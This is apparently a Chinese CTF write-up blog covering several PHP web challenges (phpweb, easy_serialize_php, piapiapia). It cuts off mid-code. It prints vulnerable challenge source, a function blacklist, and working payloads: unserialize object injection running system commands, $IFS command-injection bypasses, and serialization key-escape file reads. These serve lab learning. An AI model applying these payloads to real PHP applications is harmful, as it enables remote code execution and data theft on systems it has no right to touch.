</p><p><code>num=5e10&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824165812453.png" alt="image-20210824165812453"></p><p>反思：</p><p>1.php不行这个事属实铸币</p><p>2.对于常见函数的绕过  还得多积累</p><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>打开是个抽象 </p><p>抓包一会出来个  </p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824163604448.png" alt="image-20210824163604448"></p><p>传参</p><p><code>func=system&amp;p=ls</code>失败  估计是被过滤  </p><p><code>func=file_get_contents&amp;p=index.php</code>查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,</span><br><span class="line">&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,</span><br><span class="line">&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;,</span><br><span class="line">&quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,</span><br><span class="line">&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, </span><br><span class="line">&quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">//黑名单列表，该列表中的所有函数都不能执行</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到黑名单过滤一堆 </p><p>还存在魔法函数 有反序列化的可能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">        var $p = &quot;ls&quot;;</span><br><span class="line">        var $func = &quot;system&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>传入    </p><p>payload:<code>func=unserialize p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824163725001.png" alt="image-20210824163725001"></p><p>后端接收这两个参数后，调用<code>call_user_func</code>将上面的字符串进行反序列化，还原成上面的代码。而上面的代码核心在于创建一个Test()对象，因为在_destruct()函数是构造方法，在创建对象时会执行，根据在Test类中设置的函数名和参数值再一次执行，此时即可获取我们所需的信息。</p><p>常用命令小结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;) : 列举当前目录下的所有文件</span><br><span class="line"></span><br><span class="line">system(&quot;find / -name flag*&quot;)：查找所有文件名匹配flag*的文件</span><br><span class="line"></span><br><span class="line">system(&quot;cat $(find / -name flag**)&quot;)：**打印所有文件名匹配flag*的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824164136935.png" alt="image-20210824164136935"></p><p>payload<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>考点：代码审计 php反序列化的对象逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先  分析代码块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是会把php、flag、php5、php4和fl1g过滤为空字符串  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br></pre></td></tr></table></figure><p>这里可以找到一点信息 能看phpinfo</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210816165533719.png" alt="image-20210816165533719"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br></pre></td></tr></table></figure><p>这里是最后得到flag的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>我们不能直接给**$_SESSION[‘img’]<strong>赋值。因为</strong>$_SESSION[‘img’]**赋值是在extract()变量覆盖的后面执行的</p><p>考虑到</p><p>反序列化的对象逃逸问题一般分为两种</p><blockquote><p>第一种为关键词数增加 例如： where-&gt;hacker，这样词数由五个增加到6个<br>第二种为关键词数减少<br>例如：直接过滤掉一些关键词，例如这道题目中</p><p>第一种情况比较好构造，直接构造多个关键词，这样就能逃出几个字符<br>第二种可以是通过键逃逸和值逃逸</p><p><strong>键值逃逸</strong></p><ul><li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li><li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li></ul></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>&#125;</span><br><span class="line">ZDBnM19mMWFnLnBocA==也就是d0g3_f1ag.php的base64加密。</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;这个肯定就是我们预期的那段序列化字符，</span><br></pre></td></tr></table></figure><p><code> ;s:1:“1”;</code><br>现在的_SESSION就存在两个键值即phpflag和img对应的键值对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">var_dump( serialize(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">#&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>经过filter函数过滤后phpflag就会被替换成空，<br><code>s:7:&quot;phpflag&quot;;s:48:&quot; 就变成了 s:7:&quot;&quot;;s:48:&quot;;</code>即完成了逃逸。<br>两个键值分别被序列化成了<br><code>s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</code>即键名叫<code>&quot;;s:48: </code>对应的值为一个字符串<code>1</code><br><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>键名img对应的字符串是<code>d0g3_f1ag.php</code>的base64编码。<br>右花括号后面的<code>;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>全被当成孤儿放弃了。<br>post提交这一串payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210816165729323.png" alt="image-20210816165729323"></p><p>继续换参数编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210816165656003.png" alt="image-20210816165656003"></p><p>反思：</p><p>1.反序列化理解不够，代码审计 不够仔细</p><p>2.对于键值逃逸不了解 其他类型的对象逃逸也了解不多</p><p>3.还是见识少</p><blockquote><p>参考</p><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p><p><a href="https://blog.csdn.net/qq_46230755/article/details/111995528?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/qq_46230755/article/details/111995528?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p></blockquote><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824200443319.png" alt="image-20210824200443319"></p><p>看一看 扫一扫  </p><p>注册登录传文件没有卵用  </p><p>备份文件扫得到  </p><p>下载下来审计源码   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET 